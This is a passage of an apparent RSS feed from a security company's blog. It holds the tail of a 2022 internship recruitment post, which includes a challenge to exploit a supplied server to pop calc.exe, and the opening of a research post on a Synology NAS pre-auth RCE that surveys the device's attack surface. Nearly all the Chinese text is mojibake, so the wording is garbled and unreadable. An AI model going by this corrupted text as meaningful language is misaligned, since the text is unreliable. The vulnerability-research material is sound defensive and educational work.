      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†è§£ PortSwigger Web Security Academy ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Labã€‚
    &lt;ul&gt;
      &lt;li&gt;åƒè€ƒé€£çµï¼šhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œï¼ŒåŒ…å« Unix-like å’Œ Windows ä½œæ¥­ç³»çµ±çš„å¸¸è¦‹æˆ–å…§å»ºç³»çµ±æŒ‡ä»¤å·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxï¼‰çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day exploitã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®ã€‚&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·è³‡æ ¼å¯©æŸ¥&lt;/li&gt;
  &lt;li&gt;å•ç­”é¡Œç­”æ¡ˆï¼ˆå…± 2 é¡Œï¼Œå„çµ„åˆ¥é¡Œç›®ä¸åŒï¼Œè©³è¦‹ä¸‹æ–¹&lt;a href=&quot;/blog/2022/07/25/2nd-internship-program-recruit/#:~:text=é¡Œç›®å¦‚ä¸‹&quot;&gt;å ±åæ–¹å¼&lt;/a&gt;ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠæ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæœƒåœ¨ä¸ƒå€‹å·¥ä½œå¤©å…§å›è¦†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;

&lt;p&gt;æ­¤éšæ®µç‚º 1~2 å°æ™‚çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;é¡Œç›®ç­”æ¡ˆ&lt;/strong&gt;ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ 2022/08/12ï¼ˆäº”ï¼‰23:59 å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Web çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨ä¸‰é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å°æ–¼é€™ä»½å¯¦ç¿’çš„æœŸæœ›&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é¡Œç›®å¦‚ä¸‹ï¼Œè«‹ä¾ç…§æ¬²ç”³è«‹ä¹‹çµ„åˆ¥å›ç­”
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;ç°¡ç­”é¡Œ
            &lt;ul&gt;
              &lt;li&gt;å‡è¨­ä½ ä»Šå¤©è¦åˆ†æä¸€å°å°è¡¨æ©Ÿ
                &lt;ul&gt;
                  &lt;li&gt;ä½ æœƒå¦‚ä½•å»åˆ†æ ?&lt;/li&gt;
                  &lt;li&gt;ä½ è¦ºå¾—æœ‰å“ªäº›åœ°æ–¹å¯èƒ½æœƒç™¼ç”Ÿå•é¡Œå°è‡´æ”»æ“Šè€…å¯ä»¥ç²å¾—å°è¡¨æ©Ÿæ§åˆ¶æ¬Š? ç‚ºä»€éº¼ ?&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;å¯¦ä½œé¡Œç›®
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge.zip&quot;&gt;é¡Œç›®æª”æ¡ˆ&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;ç‚ºä¸€å€‹äº’å‹•å¼çš„ Serverï¼Œå¯é€éç¶²è·¯é€£ç·šèˆ‡ä¹‹äº’å‹•ã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;è«‹åˆ†æä¸Šè¿°æ‰€æä¾›çš„ Serverï¼Œä¸¦åˆ©ç”¨å…¶ä¸­çš„æ¼æ´åœ¨ Windows 11 ä¸Šè·³å‡º calc.exeã€‚
                &lt;ul&gt;
                  &lt;li&gt;æ¼æ´å¯èƒ½æœ‰å¾ˆå¤šï¼Œä¸ä¸€å®šæ¯å€‹éƒ½å¯ä»¥åˆ©ç”¨ã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;è«‹å‹™å¿…å¯«ä¸‹è§£é¡Œéç¨‹åŠå¦‚ä½•å»åˆ†æé€™å€‹ Serverï¼Œä¸¦äº¤ write-upï¼Œè«‹ç›¡ä½ æ‰€èƒ½ä¾†è§£é¡Œï¼Œå³ä½¿æœ€å¾Œæ²’æœ‰æˆåŠŸï¼Œä¹Ÿè«‹å¯«ä¸‹æ‚¨æ‰€å˜—è©¦éçš„æ–¹æ³•åŠæ€è·¯ï¼Œæœ¬æ¸¬é©—å°‡æœƒä»¥ write-up ç‚ºä¸»è¦ä¾æ“šã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;ç•¶ä½ åœ¨ç¶²é ç€è¦½å™¨çš„ç¶²å€åˆ—ä¸Šè¼¸å…¥ä¸€ä¸²ç¶²å€ï¼ˆä¾‹å¦‚ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;ï¼‰ï¼Œéš¨å¾ŒæŒ‰ä¸‹ Enter éµåˆ°å‡ºç¾ç¶²é ç•«é¢ç‚ºæ­¢ï¼Œè«‹å•ä¸­é–“ç™¼ç”Ÿäº†ä»€éº¼äº‹æƒ…ï¼Ÿè«‹æ ¹æ“šä½ æ‰€çŸ¥çš„çŸ¥è­˜èƒŒæ™¯ï¼Œä»¥æ–‡å­—ç›¡å¯èƒ½èªªæ˜ã€‚&lt;/li&gt;
          &lt;li&gt;è«‹æå‡ºä¸‰å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2020 ~ 2022 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£ç°¡è¿°èªªæ˜å„å€‹æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ï¼Œä»¥åŠæ‰€å°æ‡‰åˆ°çš„ OWASP Top 10 / CWE é¡åˆ¥ã€‚&lt;/li&gt;
          &lt;li&gt;ï¼ˆä¸Šè¿°é¡Œç›®å»ºè­°æ’°å¯« 1~2 é å³å¯ï¼‰&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit</guid>
                <pubDate>Mon, 25 Jul 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å‰å¹´æˆ‘å€‘åœ¨ Synology çš„ NAS ä¸­ç™¼ç¾äº† &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;Pre-auth RCE çš„æ¼æ´(CVE-2021-31439)&lt;/a&gt;ï¼Œä¸¦åœ¨ Pwn2Own Tokyo ä¸­å–å¾—äº† Synology DS418 play çš„æ§åˆ¶æ¬Šï¼Œè€ŒæˆåŠŸç²å¾— Pwn2Own çš„é»æ•¸ï¼Œå¾ŒçºŒä¹Ÿç™¼ç¾é€™å€‹æ¼æ´ä¸åªå­˜åœ¨ Synology çš„ NASï¼Œä¹ŸåŒæ™‚å­˜åœ¨å¤šæ•¸å» ç‰Œçš„ NAS ä¸­ï¼Œé€™ç¯‡ç ”ç©¶å°‡è¬›è¿°é€™æ¼æ´çš„ç´°ç¯€åŠæˆ‘å€‘çš„åˆ©ç”¨æ–¹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤ä»½ç ”ç©¶äº¦ç™¼è¡¨æ–¼ &lt;a href=&quot;https://hitcon.org/2021/&quot;&gt;HITCON 2021&lt;/a&gt;ï¼Œä½ å¯ä»¥å¾&lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;é€™è£¡&lt;/a&gt;å–å¾—æŠ•å½±ç‰‡ï¼&lt;/p&gt;

&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;æ—©æœŸ NAS ä¸€èˆ¬ç”¨é€”ç‚ºè®“ä¼ºæœå™¨æœ¬èº«èˆ‡è³‡æ–™åˆ†é–‹ä¹Ÿç‚ºäº†åšç•°åœ°å‚™æ´è€Œä½¿ç”¨çš„è¨­å‚™ï¼ŒåŠŸèƒ½ä¸Šä¸»è¦å–®ç´”è®“ä½¿ç”¨è€…å¯ä»¥ç›´æ¥åœ¨ç¶²è·¯ä¸Šå­˜å–è³‡æ–™åŠåˆ†äº«æª”æ¡ˆï¼Œç¾ä»Šçš„ NAS æ›´æ˜¯æä¾›å¤šç¨®æœå‹™ï¼Œä¸æ­¢æª”æ¡ˆåˆ†äº«æ›´åŠ æ–¹ä¾¿ï¼Œä¹Ÿèˆ‡ IoT çš„ç’°å¢ƒæ›´åŠ å¯†åˆ‡ï¼Œä¾‹å¦‚ SMB/AFP ç­‰æœå‹™ï¼Œå¯è¼•æ˜“çš„è®“ä¸åŒç³»çµ±çš„é›»è…¦åˆ†äº«æª”æ¡ˆï¼Œæ™®åŠç‡ä¹Ÿé æ¯”ä»¥å‰é«˜å¾ˆå¤šã€‚&lt;/p&gt;

&lt;p&gt;ç¾ä»Šçš„ NASï¼Œä¹Ÿå¯è£ä¸Šè¨±å¤šå¥—ä»¶ï¼Œæ›´æ˜¯æœ‰ä¸å°‘äººæ‹¿ä¾†æ¶è¨­ Serverï¼Œåœ¨é€™æ™ºæ…§å®¶åº­çš„å¹´ä»£ä¸­ï¼Œæ›´æ˜¯æœƒæœ‰ä¸å°‘äººèˆ‡ home assistant çµåˆï¼Œä½¿å¾—ç”Ÿæ´»æ›´åŠ ä¾¿åˆ©ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;ç‚ºä½•æˆ‘å€‘è¦å»ç ”ç©¶-nas-å‘¢-&quot;&gt;ç‚ºä½•æˆ‘å€‘è¦å»ç ”ç©¶ NAS å‘¢ ?&lt;/h3&gt;

&lt;h4 id=&quot;ç´…éšŠéœ€æ±‚&quot;&gt;ç´…éšŠéœ€æ±‚&lt;/h4&gt;
&lt;p&gt;éå»åœ¨æˆ‘å€‘åœ˜éšŠåœ¨åŸ·è¡Œç´…éšŠéç¨‹ä¸­ï¼ŒNAS æ™®éæœƒå‡ºç¾åœ¨ä¼æ¥­çš„å…§ç¶²ä¸­ï¼Œæœ‰æ™‚æ›´æœƒæš´éœ²åœ¨å¤–ç¶²ï¼Œæœ‰æ™‚æ›´æœƒå­˜æ”¾ä¸å°‘ä¼æ¥­çš„æ©Ÿå¯†è³‡æ–™åœ¨ NAS ä¸Šï¼Œå› æ­¤ NAS æ¼¸æ¼¸è¢«æˆ‘å€‘é—œæ³¨ï¼Œæˆ°ç•¥åƒ¹å€¼ä¹Ÿæ¯”ä»¥å¾€é«˜å¾ˆå¤šã€‚&lt;/p&gt;

&lt;h4 id=&quot;å‹’ç´¢ç—…æ¯’&quot;&gt;å‹’ç´¢ç—…æ¯’&lt;/h4&gt;
&lt;p&gt;è¿‘å¹´ä¾†å› ç‚º NAS æ—¥ç›Šæ™®åŠï¼Œå¸¸è¢«æ‹¿ä¾†æ”¾å€‹äººçš„é‡è¦è³‡æ–™ï¼Œä½¿ NAS æˆç‚ºäº†å‹’ç´¢ç—…æ¯’çš„ç›®æ¨™ï¼Œé€šå¸¸é§­å®¢çµ„ç¹”éƒ½æœƒåˆ©ç”¨æ¼æ´å…¥ä¾µ NAS å¾Œï¼Œå°‡å­˜æ”¾åœ¨ NAS ä¸­çš„æª”æ¡ˆéƒ½åŠ å¯†å¾Œå‹’ç´¢ï¼Œè€Œä»Šå¹´å¹´åˆæ‰åˆçˆ†ç™¼ä¸€æ³¢ locker ç³»åˆ—çš„äº‹ä»¶ï¼Œæˆ‘å€‘å¸Œæœ›å¯ä»¥æ¸›å°‘é¡ä¼¼çš„äº‹æƒ…å†æ¬¡ç™¼ç”Ÿï¼Œå› è€Œæé«˜ NAS ç ”ç©¶çš„å„ªå…ˆç¨‹åº¦ï¼Œä¾†å¢åŠ  NAS å®‰å…¨æ€§ã€‚ä¹Ÿç‚ºäº†æˆ‘å€‘å¯¦ç¾è®“ä¸–ç•Œæ›´å®‰å…¨çš„ç†æƒ³ã€‚&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;æœ€å¾Œä¸€é»æ˜¯ NAS å¾ 2020 é–‹å§‹ï¼Œæˆç‚ºäº† Pwn2Own Mobile çš„ä¸»è¦ç›®æ¨™ä¹‹ä¸€ï¼Œåˆå‰›å¥½å‰å¹´æˆ‘å€‘ä¹Ÿæƒ³å˜—è©¦æŒ‘æˆ°çœ‹çœ‹ Pwn2Own çš„èˆå°ï¼Œæ‰€ä»¥æ±ºå®šä»¥ NAS ä½œç‚ºç•¶æ™‚ç ”ç©¶çš„é¦–è¦ç›®æ¨™ï¼Œå‰å¹´ Pwn2Own çš„ç›®æ¨™ç‚º Synology åŠ WD ï¼Œç”±æ–¼ Synology ç‚ºå°ç£ä¼æ¥­å¸¸è¦‹è¨­å‚™ï¼Œæ‰€ä»¥æˆ‘å€‘æœ€å¾Œé¸æ“‡äº† Synology é–‹å§‹ç ”ç©¶ã€‚&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘å€‘çš„æ¸¬è©¦ç’°å¢ƒæ˜¯ DS918+ èˆ‡ Pwn2own ç›®æ¨™æ¥µç‚ºé¡ä¼¼çš„å‹è™Ÿï¼Œæˆ‘å€‘ç‚ºäº†æ›´ä½³ç¬¦åˆå¹³å¸¸æœƒé‡åˆ°çš„ç’°å¢ƒä»¥åŠ Pwn2Own ä¸­è¦æ±‚ï¼Œæœƒæ˜¯å…¨éƒ¨ default setting çš„ç‹€æ…‹ã€‚&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é¦–å…ˆå¯å…ˆç”¨ netstat çœ‹ tcp å’Œ udp ä¸­æœ‰å“ªäº› port æ˜¯å°å¤–é–‹æ”¾ï¼Œå¯ä»¥çœ‹åˆ° tcp åŠ udp ä¸­ åœ¨ default ç’°å¢ƒä¸‹ï¼Œå°±é–‹äº†ä¸å°‘æœå‹™ï¼Œåƒæ˜¯ tcp çš„ smb/nginx/afpd ç­‰&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ udp ä¸­å‰‡æœ‰ minissdpd/findhost/snmpd ç­‰ï¼Œå¤šæ•¸éƒ½æ˜¯ä¸€äº›ç”¨ä¾†å¹«åŠ©å°‹æ‰¾è¨­å‚™çš„å”å®šã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é€™é‚ŠæŒ‘äº†å¹¾å€‹ Service åšåˆæ­¥çš„åˆ†æ&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;é¦–å…ˆæ˜¯ DSM Web ä»‹é¢ï¼Œæœ€ç›´è¦ºä¹Ÿæœ€ç›´æ¥çš„ä¸€éƒ¨åˆ†ï¼Œé€™éƒ¨åˆ†å¤§æ¦‚ä¹Ÿæœƒæ˜¯æœ€å¤šäººå»åˆ†æçš„ä¸€å¡Šï¼Œæœ‰æ˜é¡¯çš„å…¥å£é»ï¼Œåœ¨å¤è€æ™‚æœŸå¸¸æœ‰ command injection æ¼æ´ï¼Œä½†å¾Œä¾† Synology æœ‰åš´æ ¼è¦ç¯„å¾Œå¾¹åº•æ”¹å–„é€™å•é¡Œï¼Œç¨‹å¼ä¹Ÿæ¡ç”¨ç›¸å°ä¿å®ˆçš„æ–¹å¼é–‹ç™¼ï¼Œç›¸å°å®‰å…¨ä¸å°‘ã€‚&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;Synology ä¸­çš„ SMB å”å®šï¼Œä½¿ç”¨çš„æ˜¯ Open Source çš„ &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt; ï¼Œå› ä½¿ç”¨çš„äººçœ¾å¤šï¼Œé€²è¡Œ code review åŠæ¼æ´æŒ–æ˜çš„äººä¹Ÿä¸å°‘ï¼Œä½¿å¾—æ¯å¹´æœƒæœ‰ä¸å°‘å°æ´ï¼Œè¿‘æœŸæœ€åš´é‡çš„å°±æ˜¯ &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;ï¼Œä½†ç”±æ–¼è¼ƒå¤šäººåœ¨ review å®‰å…¨æ€§ç›¸å°ä¹Ÿæ¯”å…¶ä»–æœå‹™å®‰å…¨ã€‚&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;ä¸»è¦å”åŠ©ä½¿ç”¨è€…ç®¡ç†èˆ‡ç›£æ§ iSCSI æœå‹™ï¼Œç”± Synology è‡ªè¡Œé–‹ç™¼ï¼Œè¿‘æœŸç®—æ¯”è¼ƒå¸¸å‡ºç¾æ¼æ´çš„åœ°æ–¹ï¼Œä½†éœ€è¦èŠ±ä¸å°‘æ™‚é–“ Reverse ï¼Œä¸éæ˜¯å€‹ä¸éŒ¯çš„ç›®æ¨™ï¼Œå¦‚æœæ²’æœ‰å…¶ä»–æ”»æ“Šé¢ï¼Œå¯èƒ½æœƒå„ªå…ˆåˆ†æã€‚&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;æœ€å¾Œä¸€å€‹è¦æçš„æ˜¯ Netatalk ä¹Ÿå°±æ˜¯ afp å”å®šï¼ŒåŸºæœ¬ä¸Šæ²’ä»€éº¼æ”¹ï¼Œå¤§éƒ¨åˆ†æ²¿ç”¨ open source çš„ Netatalkï¼Œè¿‘æœŸæœ€åš´é‡çš„æ¼æ´ç‚º 2018 çš„ Pre-auth RCE (CVE-2018-1160)ï¼Œé—œæ–¼é€™æ¼æ´å¯åƒè€ƒ &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt; ï¼ŒNetatalk ç›¸å°å…¶ä»– Service éå»çš„æ¼æ´å°‘éå¸¸å¤šï¼Œæ˜¯æ¯”è¼ƒå°‘è¢«æ³¨æ„åˆ°çš„ä¸€å¡Šï¼Œä¸¦ä¸”å·²ç¶“é•·æ™‚é–“æ²’åœ¨æ›´æ–°ç¶­è­·ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ç¶“éæ•´é«”åˆ†æå¾Œï¼Œ èªç‚º Netatalk ä¹Ÿæœƒæ˜¯ Synology ä¸­æœ€è»Ÿçš„ä¸€å¡Šï¼Œä¸”æœ‰ &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Source code&lt;/a&gt; å¯ä»¥çœ‹ï¼Œæ‰€ä»¥æˆ‘å€‘æœ€å¾Œæ±ºå®šå…ˆåˆ†æä»–ã€‚ç•¶ç„¶ä¹Ÿé‚„æœ‰å…¶ä»– service è·Ÿæ”»æ“Šé¢ï¼Œä¸éé€™é‚Šç”±æ–¼ç¯‡å¹…å› ç´ åŠä¸¦æ²’æœ‰èŠ±å¤ªå¤šæ™‚é–“å»ç ”ç©¶å°±ä¸ä¸€ä¸€åˆ†æä»‹ç´¹äº†ã€‚æˆ‘å€‘é€™æ¬¡çš„é‡é»å°±åœ¨æ–¼ Netatalkã€‚&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
